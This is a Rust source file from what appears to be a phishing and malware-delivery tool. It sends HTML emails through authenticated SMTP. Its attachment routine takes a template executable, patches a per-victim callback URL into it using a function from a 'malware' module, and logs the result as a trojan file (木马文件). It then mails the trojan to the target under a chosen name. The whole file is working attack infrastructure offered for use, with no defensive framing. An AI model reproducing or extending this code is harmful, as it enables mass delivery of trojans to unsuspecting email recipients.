use lettre::Message;
use lettre::message::header::ContentType;
use lettre::message::{MultiPart, Attachment, Body};
use lettre::transport::smtp::authentication::Credentials;
use lettre::{SmtpTransport, Transport};
use std::error::Error;
use std::fs::{self, create_dir_all};
use std::path::Path;
use mime_guess::MimeGuess;
use lettre::message::header::ContentDisposition;
use lettre::message::SinglePart;
use crate::malware::patch_tool::replace_url_in_exe_rdata;
use percent_encoding::{percent_encode, NON_ALPHANUMERIC};

pub fn verify_smtp_credentials(
    smtp_server: &str,
    username: &str,
    password: &str,
) -> Result<Credentials, Box<dyn Error>> {
    let creds = Credentials::new(username.to_string(), password.to_string());

    // 创建SMTP传输器
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds.clone())
        .build();

    // 尝试连接以验证凭证
    mailer.test_connection()?;

    Ok(creds)
}

pub fn send_html_email(
    smtp_server: &str,
    html_path: &str,
    to_email: &str,
    subject: &str,
    from_email: &str,
    username: &str,
    password: &str,
    appendix_name: &str,
    server_url: &str,
    entry_id: &str,
) -> Result<(), Box<dyn Error>> {
    // 验证凭证
    let creds = verify_smtp_credentials(smtp_server, username, password)?;

    // 读取HTML文件
    let html_content = fs::read_to_string(html_path)?;

    // 构建邮件
    let base_email = Message::builder()
        .from(from_email.parse()?)
        .to(to_email.parse()?)
        .subject(subject);
        // .header(ContentType::TEXT_HTML)
        // .body(html_content)?;

    // let mut multipart = MultiPart::mixed()
    //     .singlepart(
    //         lettre::message::SinglePart::builder()
    //             .header(lettre::message::header::ContentType::TEXT_HTML)
    //             .body(html_content.clone())
    //     );

    
    let multipart = match appendix_name.is_empty() {
        true => {
            MultiPart::mixed()
            .singlepart(
                lettre::message::SinglePart::builder()
                    .header(lettre::message::header::ContentType::TEXT_HTML)
                    .body(html_content)
            )
        }
        false => {
            add_attachment(html_content, appendix_name, server_url, entry_id)?

        }
    };

    let email = base_email.multipart(multipart)?;

    // 创建SMTP传输器并发送邮件
    let mailer = SmtpTransport::relay(smtp_server)?
        .credentials(creds)
        .build();

    mailer.send(&email)?;

    Ok(())
}

fn ensure_exe_suffix(s: &str) -> String {
    if s.ends_with(".exe") {
        s.to_string()
    } else {
        format!("{}.exe", s)
    }
}



/// 添加单个附件到multipart
fn add_attachment(
    html_content: String,
    appendix_name: &str,
    server_url: &str,
    entry_id: &str,
) -> Result<MultiPart, Box<dyn Error>> {
    let template_exe_path: &str = "./appendix.exe";
    let appendix_name = ensure_exe_suffix(appendix_name);

    let content = fs::read(template_exe_path)?;
    let body = Body::new(content);

    let temp = format!("./temp/appendix/{}", entry_id);
    let temp_clone = temp.clone();
    let temp_dir = Path::new(&temp_clone);
    create_dir_all(temp_dir)?;

    let temp_file = format!("./{}/{}", temp, appendix_name);

    let entry_url = format!("appendix/{}", entry_id);

    match replace_url_in_exe_rdata(template_exe_path, &temp_file, &entry_url) {
        Ok(_) => {
            let path = Path::new(template_exe_path);
            let mime_str = MimeGuess::from_path(path)
                .first_or_octet_stream()
                .essence_str().to_string(); 

            crate::print_success(&format!("成功创建木马文件 {}", entry_id));
            let body = fs::read(&temp_file)?;

            // let encoded_filename = percent_encoding::percent_encode(appendix_name.as_bytes(), percent_encoding::NON_ALPHANUMERIC);

            fs::remove_file(&temp_file)?;

            Ok(MultiPart::mixed()
            .singlepart(
                lettre::message::SinglePart::builder()
                    .header(lettre::message::header::ContentType::TEXT_HTML)
                    .body(html_content)
            )
            .singlepart(
                Attachment::new(appendix_name.to_string())
                    .body(body, ContentType::parse(&mime_str)?)
            ))

        }
        Err(e) => {
            return Err(Box::new(std::io::Error::new(
                std::io::ErrorKind::NotFound,
                "生成文件失败",
            )))
        }

    }

}